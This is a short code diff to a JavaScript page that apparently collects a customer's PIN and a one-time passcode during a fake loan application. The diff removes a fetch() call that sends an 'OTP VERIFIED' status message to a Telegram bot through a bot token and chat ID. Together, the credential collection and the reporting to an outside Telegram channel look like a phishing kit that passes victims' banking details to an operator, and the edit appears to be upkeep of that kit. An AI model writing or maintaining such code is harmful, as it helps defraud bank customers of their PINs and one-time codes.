@@ -404,12 +404,7 @@ let userPin = '';
         document.getElementById('otp-approved').style.display = 'block';
         document.getElementById('otp-approved').querySelector('p').textContent = '✓ OTP Verified!';
         
-        // Send ONE message - OTP VERIFIED
-        fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: '\u2705 OTP VERIFIED - Customer can proceed to loan details!' })
-        });
+        // Skip sending extra Telegram message
         
         setTimeout(() => { showStep(3); }, 500);
     }
